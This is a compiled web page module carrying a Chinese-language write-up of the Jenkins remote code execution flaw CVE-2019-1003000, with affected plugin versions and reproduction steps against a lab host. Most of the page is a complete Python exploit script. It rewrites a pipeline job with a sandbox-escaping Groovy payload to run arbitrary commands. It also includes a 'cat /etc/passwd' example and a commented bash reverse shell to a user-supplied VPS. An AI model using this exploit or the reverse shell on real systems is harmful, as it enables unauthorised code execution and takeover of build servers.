import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-58e4a7d6.js";const t={},p=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成.</p><p>该漏洞存在于<code>Declarative Plugin 1.3.4.1</code>之前的版本, <code>Groovy Plugin 2.61.1</code>之前的版本以及<code>Script Security Plugin 1.50</code>之前的版本。该漏洞通过将AST转换注释（如@Grab）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有<code>Overall/Read</code>权限的用户或能够控制SCM中的<code>Jenkinsfile</code>或者<code>sandboxed Pipeline</code>共享库内容的用户可以绕过沙盒保护并在Jenkins主服务器上执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Declarative Plugin &lt; 1.3.4.1
Groovy Plugin &lt; 2.61.1
Script Security Plugin &lt; 1.50
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>账号密码 user1/user1 登录：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240322151659595.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># activate py27</span>
python exploit.py <span class="token parameter variable">--url</span> http://eci-2ze1x17tl0kujrg3c5ey.cloudeci1.ichunqiu.com:8080 <span class="token parameter variable">--job</span> my-pipeline <span class="token parameter variable">--username</span> user1 <span class="token parameter variable">--password</span> user1 <span class="token parameter variable">--cmd</span> <span class="token string">&quot;cat /etc/passwd&quot;</span>

<span class="token comment"># --cmd &quot;bash -i &gt;&amp; /dev/tcp/&lt;YOUR-VPS-IP&gt;/&lt;YOUR-VPS-PORT&gt; 0&gt;&amp;1&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240322151954995.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python exploit.py --url http://jenkins-site.com --job job_name --username your_user --password your_passwd --cmd &quot;cat /etc/passwd&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>

<span class="token comment"># Author: Adam Jordan</span>
<span class="token comment"># Date: 2019-02-15</span>
<span class="token comment"># Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span>
<span class="token comment"># PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</span>


<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> jenkins
<span class="token keyword">import</span> time
<span class="token keyword">from</span> xml<span class="token punctuation">.</span>etree <span class="token keyword">import</span> ElementTree

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&#39;&#39;&#39;
import org.buildobjects.process.ProcBuilder
@Grab(&#39;org.buildobjects:jproc:2.2.3&#39;)
class Dummy{ }

print new ProcBuilder(&quot;/bin/bash&quot;).withArgs(&quot;-c&quot;,&quot;%s&quot;).run().getOutputString()
&#39;&#39;&#39;</span>


<span class="token keyword">def</span> <span class="token function">run_command</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> job_name<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">&#39;[+] connecting to jenkins...&#39;</span>
    server <span class="token operator">=</span> jenkins<span class="token punctuation">.</span>Jenkins<span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] crafting payload...&#39;</span>
    ori_job_config <span class="token operator">=</span> server<span class="token punctuation">.</span>get_job_config<span class="token punctuation">(</span>job_name<span class="token punctuation">)</span>
    et <span class="token operator">=</span> ElementTree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>ori_job_config<span class="token punctuation">)</span>
    et<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&#39;definition/script&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text <span class="token operator">=</span> payload <span class="token operator">%</span> cmd
    job_config <span class="token operator">=</span> ElementTree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>et<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">&#39;xml&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] modifying job with payload...&#39;</span>
    server<span class="token punctuation">.</span>reconfig_job<span class="token punctuation">(</span>job_name<span class="token punctuation">,</span> job_config<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] putting job build to queue...&#39;</span>
    queue_number <span class="token operator">=</span> server<span class="token punctuation">.</span>build_job<span class="token punctuation">(</span>job_name<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] waiting for job to build...&#39;</span>
    queue_item_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">while</span> <span class="token string">&#39;executable&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> queue_item_info<span class="token punctuation">:</span>
        queue_item_info <span class="token operator">=</span> server<span class="token punctuation">.</span>get_queue_item<span class="token punctuation">(</span>queue_number<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] restoring job...&#39;</span>
    server<span class="token punctuation">.</span>reconfig_job<span class="token punctuation">(</span>job_name<span class="token punctuation">,</span> ori_job_config<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] fetching output...&#39;</span>
    last_build_number <span class="token operator">=</span> server<span class="token punctuation">.</span>get_job_info<span class="token punctuation">(</span>job_name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;lastBuild&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;number&#39;</span><span class="token punctuation">]</span>
    console_output <span class="token operator">=</span> server<span class="token punctuation">.</span>get_build_console_output<span class="token punctuation">(</span>job_name<span class="token punctuation">,</span> last_build_number<span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">&#39;[+] OUTPUT:&#39;</span>
    <span class="token keyword">print</span> console_output


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Jenkins RCE&#39;</span><span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;target jenkins url&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--cmd&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;system command to be run&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--job&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;job name&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--username&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--password&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;password&#39;</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    run_command<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> args<span class="token punctuation">.</span>job<span class="token punctuation">,</span> args<span class="token punctuation">.</span>username<span class="token punctuation">,</span> args<span class="token punctuation">.</span>password<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13),i=[p];function o(c,l){return s(),a("div",null,i)}const d=n(t,[["render",o],["__file","Jenkins 远程代码执行漏洞 CVE-2019-1003000.html.vue"]]);export{d as default};
